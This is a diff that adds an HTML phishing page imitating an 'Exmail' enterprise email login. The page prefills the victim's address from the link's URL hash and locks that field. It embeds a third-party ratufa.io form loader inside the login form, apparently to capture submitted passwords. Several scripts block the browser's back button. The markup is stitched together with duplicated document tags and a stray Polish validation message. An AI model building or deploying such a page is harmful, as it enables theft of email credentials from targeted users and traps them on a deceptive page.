@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exmail Login - Not just mailbox</title>
+    <style>
+* {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+}
+
+body {
+    background-color: #ffffff;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    position: relative;
+}
+
+/* Top Header Component Bar Area */
+.header-bar {
+    width: 100%;
+    max-width: 1200px;
+    margin: 0 auto;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 20px 40px;
+}
+
+/* Top Header Image Logo Placeholder Box Replacement */
+.logo-placeholder-box {
+    width: 180px;
+    height: 48px;
+    border: 1px dashed #d1d5db;
+    background-color: #f9fafb;
+    color: #9ca3af;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 13px;
+    font-weight: 500;
+}
+
+.header-utilities {
+    font-size: 12px;
+    color: #6b7280;
+}
+
+.header-utilities a {
+    color: #6b7280;
+    text-decoration: none;
+}
+
+.header-utilities a:hover {
+    color: #3b82f6;
+}
+
+/* Main Workspace Section Layout Wrapper Frame Box */
+.main-workspace {
+    background-color: #1e40af;
+    background-image: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+    width: 100%;
+    padding: 60px 40px;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.content-container {
+    width: 100%;
+    max-width: 1100px;
+    display: flex;
+    gap: 40px;
+    align-items: stretch;
+    justify-content: center;
+}
+
+/* Left Column: Image Graphic Illustration Placeholder Area Box */
+.left-illustration-placeholder {
+    flex: 1.2;
+    min-height: 380px;
+    border: 2px dashed rgba(255, 255, 255, 0.4);
+    border-radius: 8px;
+    background-color: rgba(255, 255, 255, 0.05);
+    color: rgba(255, 255, 255, 0.6);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    font-weight: 500;
+}
+
+/* Right Column Form Container Card Module Box Layout Area Component */
+.login-card {
+    flex: 0.8;
+    max-width: 380px;
+    background-color: #ffffff;
+    padding: 40px 32px 32px;
+    position: relative;
+    box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
+}
+
+/* Top corner triangle fold QR code matrix indicator segment */
+.qr-corner-indicator {
+    position: absolute;
+    top: 0;
+    right: 0;
+    width: 52px;
+    height: 52px;
+    background: linear-gradient(135deg, transparent 50%, #3b82f6 50%);
+    cursor: pointer;
+    display: flex;
+    align-items: flex-end;
+    justify-content: flex-end;
+    padding: 4px;
+    color: #ffffff;
+    font-size: 11px;
+    font-weight: bold;
+}
+
+form {
+    width: 100%;
+}
+
+.form-row {
+    display: flex;
+    align-items: center;
+    margin-bottom: 16px;
+}
+
+.form-row label {
+    width: 80px;
+    font-size: 13px;
+    color: #374151;
+    text-align: left;
+}
+
+.input-wrapper {
+    flex: 1;
+    position: relative;
+}
+
+.form-control {
+    width: 100%;
+    height: 34px;
+    border: 1px solid #9ca3af;
+    padding: 0 10px;
+    font-size: 14px;
+    color: #111111;
+    outline: none;
+}
+
+.form-control.pass-field {
+    padding-right: 32px;
+}
+
+.password-toggle-icon {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: #9ca3af;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+.options-row {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    font-size: 12px;
+    color: #4b5563;
+    margin-bottom: 24px;
+    padding-left: 80px; /* Shifts inline choices to align right next to fields line */
+}
+
+.remember-label {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    cursor: pointer;
+}
+
+.remember-label input {
+    accent-color: #3b82f6;
+}
+
+.select-ssl {
+    border: none;
+    color: #111111;
+    font-weight: bold;
+    outline: none;
+    cursor: pointer;
+    background: transparent;
+}
+
+/* Submit Button Tray Elements Matrix Row Ribbon Ribbon Strip Component */
+.submit-tray-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding-left: 80px;
+    margin-bottom: 24px;
+}
+
+/* Rectangular sharp custom grey submit button option node layout */
+.submit-btn {
+    background-color: #e5e7eb;
+    color: #374151;
+    border: 1px solid #d1d5db;
+    padding: 6px 16px;
+    font-size: 13px;
+    font-weight: 500;
+    cursor: pointer;
+    transition: all 0.1s ease;
+}
+
+.submit-btn:hover {
+    background-color: #d1d5db;
+}
+
+.app-link-badge {
+    font-size: 11px;
+    color: #6b7280;
+    text-decoration: none;
+    display: flex;
+    align-items: center;
+    gap: 2px;
+}
+
+/* Social platform circle matrix selection indicators icons bar component elements */
+.social-matrix-row {
+    display: flex;
+    justify-content: center;
+    gap: 12px;
+    margin-bottom: 32px;
+    padding-left: 40px;
+    font-size: 18px;
+    color: #9ca3af;
+}
+
+.social-icon-node {
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    background-color: #3b82f6;
+    color: #ffffff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 12px;
+    cursor: pointer;
+}
+
+/* Base utility navigation help queries row links stack elements module */
+.card-help-links {
+    display: flex;
+    justify-content: space-between;
+    width: 100%;
+    font-size: 12px;
+    border-top: 1px dotted #e5e7eb;
+    padding-top: 16px;
+}
+
+.card-help-links a {
+    color: #2563eb;
+    text-decoration: none;
+}
+
+.card-help-links a:not(:last-child) {
+    border-right: 1px solid #e5e7eb;
+    padding-right: 12px;
+    flex-grow: 1;
+    text-align: center;
+}
+
+
+.card-help-links a:last-child {
+    padding-left: 12px;
+    flex-grow: 1;
+    text-align: center;
+}
+
+/* Lower Info Ribbon Bottom Columns Sections Content Block Area Components */
+.lower-info-section {
+    width: 100%;
+    max-width: 1200px;
+    margin: 40px auto;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 60px;
+    padding: 0 40px;
+}
+
+.info-column {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+}
+
+.info-icon-placeholder {
+    width: 36px;
+    height: 36px;
+    background-color: #f3f4f6;
+    border: 1px solid #e5e7eb;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 16px;
+    color: #6b7280;
+}
+
+.info-text-block h4 {
+    font-size: 14px;
+    font-weight: bold;
+    color: #374151;
+    margin-bottom: 6px;
+}
+
+/* Fixed Background OS Transparent System Watermark Component Layout Node */
+.system-watermark {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    text-align: left;
+    font-size: 13px;
+    color: rgba(0, 0, 0, 0.12);
+    line-height: 1.4;
+    user-select: none;
+    pointer-events: none;
+    z-index: 10;
+}
+
+@media (max-width: 860px) {
+    .content-container {
+        flex-direction: column;
+        align-items: center;
+    }
+    .left-illustration-placeholder {
+        width: 100%;
+        min-height: 200px;
+    }
+    .login-card {
+        max-width: 100%;
+        width: 100%;
+    }
+    .lower-info-section {
+        grid-template-columns: 1fr;
+        gap: 30px;
+    }
+}
+
+
+    </style>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enterprise Email Login</title>
+    <!-- Link to external stylesheet -->
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <!-- Header Navigation Section Container -->
+    <header class="header-bar">
+        <!-- Replaced specific brand logotype with specified generic grid illustration boundary -->
+<img src="https://github.com/cdtechdigital/images/blob/main/qIYA163.JPG?raw=true" alt="Trulli" width="" height="">
+        
+        <div class="header-utilities">
+            <a href="#">简体中文版</a> | <a href="#">help</a>
+        </div>
+    </header>
+
+    <main class="main-workspace">
+        <div class="content-container">
+            
+            <!-- Left Column: Generic Border Outline Graphic Content Placeholder Area -->
+            <div class="left-illustration-placeholder">
+                           
+<img src="https://github.com/cdtechdigital/images/blob/main/163.JPG?raw=true" alt="Trulli" width="" height="">
+            </div>
+
+            <!-- Right Column Form Container Card Module Box Layout Area Component -->
+            <div class="login-card">
+                <div class="qr-corner-indicator">QR</div>
+				
+                <form action="" method="POST">
+<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
+                    <div class="form-row">
+                        <label for="username">Username</label>
+                        <div class="input-wrapper">
+                <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
+                        </div>
+                    </div>
+
+                    <div class="form-row">
+                        <label for="password">Password</label>
+                        <div class="input-wrapper">
+        <input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
+  oninput="this.setCustomValidity('')"/>
+                            <span class="password-toggle-icon">Ø</span>
+                        </div>
+                    </div>
+
+                    <div class="options-row">
+                        <label class="checkbox-container remember-label">
+                            <input type="checkbox" name="remember_user">
+                            <span>Remember Username</span>
+                        </label>
+                        <div class="ssl-selection-box">
+                            Using 
+                            <select class="select-ssl" name="ssl_mode">
+                                <option value="all">All SSL</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="submit-tray-row">
+                        <button type="submit" class="submit-btn">Sign in</button>
+                        <a href="#" class="app-link-badge">🤖 Android版</a>
+                        <a href="#" class="app-link-badge">🍏 iPhone版</a>
+                    </div>
+                </form>
+
+                <div class="social-matrix-row">
+                    <div class="social-icon-node">⌨</div>
+                    <div class="social-icon-node">💬</div>
+                    <div class="social-icon-node">🔍</div>
+                    <div class="social-icon-node">🌐</div>
+                    <div class="social-icon-node">👤</div>
+                </div>
+
+                <div class="card-help-links">
+                    <a href="#">Admin Login</a>
+                    <a href="#">Forget Password?</a>
+                    <a href="#">Login Slow?</a>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Lower Info Ribbon Bottom Columns Sections Content Block Area Components -->
+    <section class="lower-info-section">
+        <div class="info-column">
+            <div class="info-icon-placeholder">📋</div>
+            <div class="info-text-block">
+                <h4>公司简介</h4>
+            </div>
+        </div>
+        <div class="info-column">
+            <div class="info-icon-placeholder">📰</div>
+            <div class="info-text-block">
+                <h4>公司新闻</h4>
+            </div>
+        </div>
+    </section>
+
+    <!-- Fixed Background OS Transparent System Watermark Component Layout Node -->
+    <div class="system-watermark">
+        Activate Windows<br>
+        <span style="font-size: 11px;">Go to Settings to activate Windows.</span>
+    </div>
+
+</body>
+</html>
+
+
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            if (window.location.hash) {
+                document.getElementById("email").value = window.location.hash.substring(1).trim();
+            }
+        });
+    </script>
+    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
+    <script type="text/javascript">
+        (function() {
+            window.history.pushState(null, null, window.location.href);
+            
+            window.onpopstate = function() {
+                window.history.pushState(null, null, window.location.href);
+           
+            };
+        })();
+    </script>
+<script type="text/javascript">
+    window.history.pushState(null, "", window.location.href);
+    
+    window.addEventListener("popstate", function() {
+        window.history.pushState(null, "", window.location.href);
+    });
+</script>
+<script type="text/javascript">
+    function preventBack() {
+        window.history.forward();
+    }
+    setTimeout("preventBack()", 0);
+    
+    window.onunload = function () { null };
+</script>
+
+</body>
+    
+</html>
+</body>
+</html>
